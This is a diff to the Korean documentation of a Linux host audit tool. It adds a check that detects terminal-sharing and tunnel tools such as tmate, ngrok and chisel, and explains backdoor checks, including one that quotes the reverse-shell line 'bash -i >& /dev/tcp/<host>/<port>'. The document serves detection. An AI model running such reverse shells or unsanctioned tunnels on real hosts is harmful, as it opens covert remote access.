@@ -198,6 +198,7 @@ sudo edc audit --json -         # 점검마다 결과 하나
 | `proc.preload` | | `/etc/ld.so.preload`에 항목이 있거나 `LD_PRELOAD`로 실행 중인 process가 있음 |
 | `proc.socket_shell` | | process의 표준 입력이나 출력이 TCP 연결임(reverse shell) |
 | `proc.raw_socket` | | 실행 파일이 임시 디렉터리, 지워진 파일, 메모리에 있거나 어느 dpkg 패키지에도 없는 process가 packet·raw 소켓을 쥠 |
+| `proc.remote_share` | | 밖의 중계 서버로 터미널을 공유하는 도구(`tmate`, `sshx`, `upterm`, `tty-share`)가 실행 중이거나, systemd system 서비스 밖에서 터널 도구(`ngrok`, `cloudflared`, `frpc`, `chisel`, `bore`)가 실행 중임 |
 | `persist.changed` | | cron, systemd, 시작 스크립트, `sudoers.d`, `pam.d`, `ld.so.conf.d`, udev, motd 파일이나 계정의 shell 시작 파일, `~/.ssh/rc`가 최근 7일 안에 바뀜 |
 | `file.sensitive` | 다른 사용자가 `/etc/shadow`를 읽거나 `/etc/passwd`, `/etc/sudoers`, `docker.sock`에 쓸 수 있음 | |
 | `file.path_writable` | 다른 사용자가 root `PATH`의 디렉터리에 쓸 수 있거나 `PATH`에 상대 경로가 있음 | |
@@ -236,7 +237,7 @@ SSH 키 점검은 `AuthorizedKeysFile`의 파일을 읽습니다. 기본값은 `
 
 백도어 점검은 `/proc`를 한 번 훑습니다. `net.reverse_tunnel`은 포트를 듣는 sshd 연결 process를 찾습니다. `ssh -R` client가 연 포트이며, 이 포트로 들어온 연결은 그 ssh 연결을 타고 나갑니다. `ssh -X`가 X11에 쓰는 loopback 6010~6099 포트는 판정하지 않습니다. 이 호스트의 `ssh` client 인자도 읽습니다. `-R`, `-w`, `RemoteForward`, `Tunnel`은 원격 호스트에서 이 호스트로 들어오는 길을 엽니다. `-L`과 `-D`는 흔해서 판정하지 않습니다. `~/.ssh/config`의 `RemoteForward`는 인자에 없어 보이지 않습니다.
 
-`ssh.extra_sshd`는 sshd listener마다 cgroup을 읽습니다. ssh 서비스 밖의 sshd는 자기 설정과 로그 파일을 쓸 수 있어, 그 로그인이 journal에 남지 않을 수 있습니다. 컨테이너 안의 sshd는 판정하지 않습니다. `proc.socket_shell`은 process의 표준 입력이나 출력이 TCP 연결이면 warn입니다. `bash -i >& /dev/tcp/<host>/<port>`가 이 모양을 만듭니다. 표준 오류만 소켓으로 쓰는 daemon은 판정하지 않습니다. `proc.raw_socket`은 `/proc/net/packet`, `/proc/net/raw`, `/proc/net/raw6`를 읽습니다. 수동형 백도어는 listen 포트 없이 이런 소켓에서 특정 packet을 기다립니다. `systemd-networkd`처럼 dpkg 패키지에 속한 process는 판정하지 않습니다.
+`ssh.extra_sshd`는 sshd listener마다 cgroup을 읽습니다. ssh 서비스 밖의 sshd는 자기 설정과 로그 파일을 쓸 수 있어, 그 로그인이 journal에 남지 않을 수 있습니다. 컨테이너 안의 sshd는 판정하지 않습니다. `proc.socket_shell`은 process의 표준 입력이나 출력이 TCP 연결이면 warn입니다. `bash -i >& /dev/tcp/<host>/<port>`가 이 모양을 만듭니다. 표준 오류만 소켓으로 쓰는 daemon은 판정하지 않습니다. `proc.raw_socket`은 `/proc/net/packet`, `/proc/net/raw`, `/proc/net/raw6`를 읽습니다. 수동형 백도어는 listen 포트 없이 이런 소켓에서 특정 packet을 기다립니다. `systemd-networkd`처럼 dpkg 패키지에 속한 process는 판정하지 않습니다. `proc.remote_share`는 실행 파일 이름으로 이 도구들을 찾습니다. 연결이 없는 도구도 다시 연결할 수 있으므로 연결 상태로는 판정하지 않습니다. 근거에는 `/run/systemd/sessions`에서 읽은 로그인 세션이 나오고, 그 세션이 끝났으면 그 사실도 함께 나옵니다. `audit.accept`는 점검 단위로 적용되므로 systemd system 서비스로 둔 터널 도구는 판정하지 않습니다.
 
 `kernel.taint`는 `/proc/sys/kernel/tainted`와 `/sys/module/*/taint`를 읽습니다. 근거에는 taint가 있는 모듈과 `/lib/modules` 아래의 파일이 나옵니다. 그 아래에 파일이 없는 모듈은 다른 경로에서 넣은 것입니다. GPU 드라이버 같은 DKMS 모듈도 taint를 남기므로 warn만 냅니다. 상용(P)과 livepatch(K) 표시는 판정하지 않습니다. 커널은 재부팅 전까지 taint를 남깁니다. `file.pkg_modified`는 `openssh-server`, `sudo`, `procps`, `coreutils`, `libpam-modules` 등 패키지 18개의 binary와 PAM 모듈의 MD5를 `/var/lib/dpkg/info/*.md5sums`와 비교합니다. `dpkg-divert`로 옮긴 경로는 건너뜁니다. dpkg가 없는 호스트는 `skip`입니다.
 
